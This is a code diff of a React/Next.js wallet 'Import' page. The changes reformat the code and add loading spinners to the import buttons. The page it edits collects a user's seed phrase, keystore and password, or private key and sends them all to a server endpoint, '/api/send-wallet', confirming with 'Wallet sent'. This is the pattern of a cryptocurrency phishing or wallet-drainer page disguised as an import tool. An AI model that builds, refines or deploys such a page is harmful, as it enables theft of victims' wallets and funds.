@@ -1,5 +1,5 @@
 "use client"
-import { ArrowLeft, Key, FileText, Shield, } from "lucide-react";
+import { ArrowLeft, Key, FileText, Shield, Loader2, } from "lucide-react";
 import Link from "next/link";
 import { useState } from "react";
 import toast from "react-hot-toast";
@@ -20,37 +20,37 @@ const Import = () => {
   };
 
   const handleImport = async (method: string) => {
-  setImporting(true);
+    setImporting(true);
 
-  try {
-    const res = await fetch("/api/send-wallet", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        method,
-        ...formData,
-      }),
-    });
-
-    if (res.ok) {
-      toast.success(`✅ Wallet sent via ${method}`);
-      setFormData({
-        phrase: "",
-        address: "",
-        keystore: "",
-        password: "",
-        privateKey: "",
+    try {
+      const res = await fetch("/api/send-wallet", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          method,
+          ...formData,
+        }),
       });
-    } else {
-      toast.dismiss("❌ Failed to send wallet");
+
+      if (res.ok) {
+        toast.success(`✅ Wallet sent via ${method}`);
+        setFormData({
+          phrase: "",
+          address: "",
+          keystore: "",
+          password: "",
+          privateKey: "",
+        });
+      } else {
+        toast.dismiss("❌ Failed to send wallet");
+      }
+    } catch (error) {
+      console.error(error);
+      toast.dismiss("⚠️ Error connecting to API");
+    } finally {
+      setImporting(false);
     }
-  } catch (error) {
-    console.error(error);
-    toast.dismiss("⚠️ Error connecting to API");
-  } finally {
-    setImporting(false);
-  }
-};
+  };
 
   return (
     <div className="min-h-screen bg-gray-900 text-white">
@@ -70,9 +70,8 @@ const Import = () => {
         <div className="max-w-4xl mx-auto space-y-8">
           <div className="flex gap-2 border-b border-gray-700">
             <button
-              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${
-                activeTab === "phrase" ? "bg-gray-800 text-blue-500" : "text-gray-400 hover:text-white"
-              }`}
+              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${activeTab === "phrase" ? "bg-gray-800 text-blue-500" : "text-gray-400 hover:text-white"
+                }`}
               onClick={() => setActiveTab("phrase")}
             >
               <div className="flex items-center justify-center gap-1">
@@ -80,9 +79,8 @@ const Import = () => {
               </div>
             </button>
             <button
-              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${
-                activeTab === "keystore" ? "bg-gray-800 text-cyan-400" : "text-gray-400 hover:text-white"
-              }`}
+              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${activeTab === "keystore" ? "bg-gray-800 text-cyan-400" : "text-gray-400 hover:text-white"
+                }`}
               onClick={() => setActiveTab("keystore")}
             >
               <div className="flex items-center justify-center gap-1">
@@ -90,9 +88,8 @@ const Import = () => {
               </div>
             </button>
             <button
-              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${
-                activeTab === "privatekey" ? "bg-gray-800 text-pink-400" : "text-gray-400 hover:text-white"
-              }`}
+              className={`flex-1 py-2 text-sm font-medium rounded-t-lg ${activeTab === "privatekey" ? "bg-gray-800 text-pink-400" : "text-gray-400 hover:text-white"
+                }`}
               onClick={() => setActiveTab("privatekey")}
             >
               <div className="flex items-center justify-center gap-1">
@@ -122,9 +119,16 @@ const Import = () => {
                 <button
                   onClick={() => handleImport("Seed Phrase")}
                   disabled={importing || !formData.phrase.trim()}
-                  className="w-full py-2 rounded-lg bg-blue-500 hover:bg-blue-600 disabled:opacity-50 transition"
+                  className="w-full flex items-center justify-center gap-2 py-2 rounded-lg bg-blue-500 hover:bg-blue-600 disabled:opacity-50 transition"
                 >
-                  {importing ? "Importing..." : "Import Wallet"}
+                  {importing ? (
+                    <>
+                      <Loader2 className="h-5 w-5 animate-spin" aria-hidden="true" />
+                      <span aria-live="polite">Importing...</span>
+                    </>
+                  ) : (
+                    "Import Wallet"
+                  )}
                 </button>
               </div>
             )}
@@ -148,9 +152,16 @@ const Import = () => {
                 <button
                   onClick={() => handleImport("Keystore")}
                   disabled={importing || !formData.keystore.trim() || !formData.password.trim()}
-                  className="w-full py-2 rounded-lg bg-cyan-400 hover:bg-cyan-500 disabled:opacity-50 transition"
+                  className="w-full flex items-center justify-center gap-2 py-2 rounded-lg bg-blue-500 hover:bg-blue-600 disabled:opacity-50 transition"
                 >
-                  {importing ? "Importing..." : "Import Wallet"}
+                  {importing ? (
+                    <>
+                      <Loader2 className="h-5 w-5 animate-spin" aria-hidden="true" />
+                      <span aria-live="polite">Importing...</span>
+                    </>
+                  ) : (
+                    "Import Wallet"
+                  )}
                 </button>
               </div>
             )}
@@ -175,9 +186,16 @@ const Import = () => {
                 <button
                   onClick={() => handleImport("Private Key")}
                   disabled={importing || !formData.privateKey.trim()}
-                  className="w-full py-2 rounded-lg bg-pink-400 hover:bg-pink-500 disabled:opacity-50 transition"
+                  className="w-full flex items-center justify-center gap-2 py-2 rounded-lg bg-blue-500 hover:bg-blue-600 disabled:opacity-50 transition"
                 >
-                  {importing ? "Importing..." : "Import Wallet"}
+                  {importing ? (
+                    <>
+                      <Loader2 className="h-5 w-5 animate-spin" aria-hidden="true" />
+                      <span aria-live="polite">Importing...</span>
+                    </>
+                  ) : (
+                    "Import Wallet"
+                  )}
                 </button>
               </div>
             )}
